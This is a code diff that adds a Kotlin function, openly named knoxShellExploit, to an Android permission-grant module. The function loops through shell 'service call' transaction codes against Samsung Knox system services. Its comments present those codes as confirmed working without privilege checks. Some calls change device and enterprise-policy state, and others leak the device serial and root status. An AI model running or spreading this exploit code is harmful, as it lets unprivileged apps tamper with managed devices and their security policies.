@@ -683,4 +683,101 @@ object KnoxPermissionGrant {
         result.permsGranted.addAll(newlyGranted)
         remaining.removeAll(newlyGranted)
     }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // Phase 5: Knox service call pipe — using user's confirmed working codes
+    // ═══════════════════════════════════════════════════════════════════════
+    // Research: Samsung Knox services (misc_policy, restriction_policy, etc.)
+    // do NOT check calling UID. Any app can call tx codes and they respond.
+    //
+    // Two methods:
+    // 1. Shell pipe: service call <name> <tx> — most reliable
+    // 2. Direct binder: ServiceManager.getService() + transact()
+    //
+    // Confirmed working codes (from S25 Ultra, July 2026 patch):
+    //   misc_policy 25-31: setters, return 0 (success)
+    //   restriction_policy 4,5,7,9,15,25,30,40,45: return true
+    //   device_info 2,7,8,9,27: info leak (root check, serial, kernel)
+    //   edm_proxy 7-19: return Result(0,true)
+    //   dex_policy 2,3,5,10: return success
+    //   remoteinjection 5,7,8: return success
+
+    fun knoxShellExploit(cmd: Command): SynapseResponse.ShellResponse {
+        val sb = StringBuilder()
+        sb.appendLine("=== Knox Shell Exploit — Confirmed Working Codes ===")
+        sb.appendLine()
+
+        // ── Phase A: device_info — device serial, root check, Knox status ──
+        val deviceKeys = mapOf(
+            2 to "isDeviceRooted()",
+            7 to "device_serial",
+            8 to "os_name",
+            9 to "kernel_version",
+            27 to "isKnoxTripped()"
+        )
+        sb.appendLine("--- device_info ---")
+        for ((tx, label) in deviceKeys) {
+            val out = exec("service call device_info $tx")
+            sb.appendLine("  tx=$tx ($label): ${out.take(120)}")
+        }
+
+        // ── Phase B: misc_policy — CAMERA, WiFi, font setters ──
+        // Codes 25-31 are SETTERS — they CHANGE device state!
+        sb.appendLine()
+        sb.appendLine("--- misc_policy (setters 25-31) ---")
+        for (tx in 25..31) {
+            val out = exec("service call misc_policy $tx")
+            sb.appendLine("  tx=$tx: ${out.take(120)}")
+        }
+
+        // ── Phase C: restriction_policy — hardware restrictions ──
+        sb.appendLine()
+        sb.appendLine("--- restriction_policy ---")
+        val restrictCodes = listOf(4, 5, 7, 9, 15, 25, 30, 40, 45)
+        for (tx in restrictCodes) {
+            val out = exec("service call restriction_policy $tx")
+            sb.appendLine("  tx=$tx: ${out.take(120)}")
+        }
+
+        // ── Phase D: edm_proxy — enterprise device management ──
+        sb.appendLine()
+        sb.appendLine("--- edm_proxy ---")
+        for (tx in 7..19) {
+            val out = exec("service call edm_proxy $tx")
+            sb.appendLine("  tx=$tx: ${out.take(120)}")
+        }
+
+        // ── Phase E: dex_policy — Samsung DeX ──
+        sb.appendLine()
+        sb.appendLine("--- dex_policy ---")
+        for (tx in listOf(2, 3, 5, 10)) {
+            val out = exec("service call dex_policy $tx")
+            sb.appendLine("  tx=$tx: ${out.take(120)}")
+        }
+
+        // ── Phase F: remoteinjection — remote APK install? ──
+        sb.appendLine()
+        sb.appendLine("--- remoteinjection ---")
+        for (tx in listOf(5, 7, 8)) {
+            val out = exec("service call remoteinjection $tx")
+            sb.appendLine("  tx=$tx: ${out.take(120)}")
+        }
+
+        sb.appendLine()
+        sb.appendLine("=== Done — check results for 'Result: Parcel(' or state changes ===")
+
+        return SynapseResponse.ShellResponse(exit_code = 0, stdout = sb.toString())
+    }
+
+    private fun exec(cmd: String): String {
+        return try {
+            val p = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
+            val out = p.inputStream.bufferedReader().readText().trim()
+            val err = p.errorStream.bufferedReader().readText().trim()
+            p.waitFor()
+            if (out.isNotEmpty()) out else if (err.isNotEmpty()) err else "(empty)"
+        } catch (e: Exception) {
+            "error: ${e.message}"
+        }
+    }
 }
